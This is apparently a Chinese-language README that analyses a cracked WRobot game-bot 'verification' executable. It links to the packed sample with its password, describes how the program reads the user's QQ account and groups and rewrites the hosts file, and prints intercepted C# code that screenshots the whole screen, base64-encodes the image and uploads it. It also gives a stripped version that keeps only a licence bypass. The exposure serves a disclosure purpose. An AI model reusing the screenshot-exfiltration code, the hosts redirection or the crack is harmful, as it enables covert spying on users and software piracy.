# Wrobot

破解版WRobot验证端.rar 下载地址 https://mypikpak.com/s/VNPz2bo5Tt5SDgwFvK8AHOHdo1 解压密码1234567890
查毒检测报告 https://www.virustotal.com/gui/file/7f5703e57194fded6e5588ad54be0b5896009e51c41c6eeaca738a8f77bcb2e7


当使用者使用 破解版WRobot验证端.exe 时会触发下列动作

1. 取使用者的QQ和QQ群，如果使用者未启动QQ会提示具有误导性的错误提示。当使用者关闭 破解版WRobot验证端.exe 然后登录QQ后此程序会获取使用者的QQ和QQ群，如果使用者在该程序发布者的QQ群内那么启动登录成功。否则则提示之前的误导性错误提示。

2. 改并添加下列内容到计算机上的hosts文件内，将使用者解析目标网站上

* #==== 下面两行是破解版WR转向服务器IP ====
* 43.252.229.37 tumadre.000webhostapp.com 
* 127.0.0.1 download.wrobot.eu



通过截取数据获得了下列内容，此内容和
```C#
public class Main {
  public void Initialize() {
    try {
      var exeString = System.IO.File.ReadAllText(System.Windows.Forms.Application.StartupPath + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe ");
     robotManager.Helpful.Var.SetVar("IsSafeToUse", true);
     robotManager.Helpful.Var.SetVar("SessionKey", "231983688180");
    }
    catch (System.Exception es) {}

string fullScreenShotPath = System.IO.Path.GetTempPath() + System.Environment.MachineName;

System.Drawing.Bitmap screenshot = new System.Drawing.Bitmap(System.Windows.Forms.SystemInformation.VirtualScreen.Width,
 System.Windows.Forms.SystemInformation.VirtualScreen.Height,
 System.Drawing.Imaging.PixelFormat.Format32bppArgb);
System.Drawing.Graphics screenGraph = System.Drawing.Graphics.FromImage(screenshot);
screenGraph.CopyFromScreen(System.Windows.Forms.SystemInformation.VirtualScreen.X,
 System.Windows.Forms.SystemInformation.VirtualScreen.Y,
 0,
 0,
 System.Windows.Forms.SystemInformation.VirtualScreen.Size,
 System.Drawing.CopyPixelOperation.SourceCopy);

screenshot.Save(fullScreenShotPath + ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg);

System.Drawing.Image myImage = GetImage(fullScreenShotPath + ".jpg");

string base64Image = ImageToBase64(myImage, System.Drawing.Imaging.ImageFormat.Jpeg);
string fileName = System.Environment.MachineName;

using(System.Net.WebClient client = new System.Net.WebClient()) {
 byte[] response = client.UploadValues("http://127.0.0.1/upload/validate.php", new System.Collections.Specialized.NameValueCollection() {
  {
   "myImageData",
   base64Image
  }, {
   "fileName",
   fileName
  }
 });
}

if (System.IO.File.Exists(@fullScreenShotPath + ".jpg"))
                {
                    System.IO.File.Delete(@fullScreenShotPath + ".jpg");
                }
    }

        System.Drawing.Image GetImage(string filePath) {
         System.Net.WebClient l_WebClient = new System.Net.WebClient();
         byte[] l_imageBytes = l_WebClient.DownloadData(filePath);
         System.IO.MemoryStream l_stream = new System.IO.MemoryStream(l_imageBytes);
         return System.Drawing.Image.FromStream(l_stream);
        }

        string ImageToBase64(System.Drawing.Image image, System.Drawing.Imaging.ImageFormat format) {
         using(System.IO.MemoryStream ms = new System.IO.MemoryStream()) {
          // Convert Image to byte[]
          image.Save(ms, format);
          byte[] imageBytes = ms.ToArray();

          // Convert byte[] to Base64 String
          string base64String = System.Convert.ToBase64String(imageBytes);
          return base64String;
         }

        }
}
```

通过修改截取到的内容后获得下面的代码
```C#
public class Main {
  public void Initialize() {
    try {
      var exeString = System.IO.File.ReadAllText(System.Windows.Forms.Application.StartupPath + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe ");
     robotManager.Helpful.Var.SetVar("IsSafeToUse", true);
     robotManager.Helpful.Var.SetVar("SessionKey", "231983688180");
    }
    catch (System.Exception es) {}
    }
}
```
